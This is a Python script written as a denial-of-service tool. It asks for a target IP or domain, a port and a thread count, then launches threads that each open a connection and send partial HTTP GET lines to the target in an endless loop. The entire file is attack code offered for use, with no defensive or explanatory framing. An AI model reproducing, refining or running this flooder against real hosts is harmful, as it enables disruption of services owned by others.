import socket
import threading

# Function to perform DoS attack
def dos_attack(target_ip, target_port):
    client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    client.settimeout(5)
    try:
        client.connect((target_ip, target_port))
        print(f"Connected to {target_ip}:{target_port}")
        while True:
            client.send(b"GET / HTTP/1.1\r\n")
            print(f"Sending packets to {target_ip}:{target_port}")
    except socket.error:
        print(f"Unable to connect to {target_ip}:{target_port}")
        client.close()

# Function to resolve domain to IP address
def resolve_domain(domain):
    try:
        ip = socket.gethostbyname(domain)
        print(f"Resolved domain {domain} to IP address {ip}")
        return ip
    except socket.gaierror:
        print(f"Unable to resolve domain: {domain}")
        return None

# Function to check if the string is a valid IP address
def is_valid_ip(address):
    try:
        socket.inet_aton(address)  # Check if it is a valid IPv4 address
        return True
    except socket.error:
        return False

# Function to create multiple threads for DoS attack
def start_attack(target, target_port, num_threads):
    # Remove protocol if present (http:// or https://)
    if target.startswith("http://") or target.startswith("https://"):
        target = target.split("//")[1]

    # Check if target is a domain or IP
    if is_valid_ip(target):
        target_ip = target
    else:
        target_ip = resolve_domain(target)
        if target_ip is None:
            return  # Exit if domain cannot be resolved

    print(f"Starting DoS attack on {target_ip}:{target_port} with {num_threads} threads.")
    for _ in range(num_threads):
        attack_thread = threading.Thread(target=dos_attack, args=(target_ip, target_port))
        attack_thread.start()

if __name__ == "__main__":
    target = input("Enter target IP address or domain: ")
    target_port = int(input("Enter target port: "))
    num_threads = int(input("Enter number of threads: "))

    start_attack(target, target_port, num_threads)
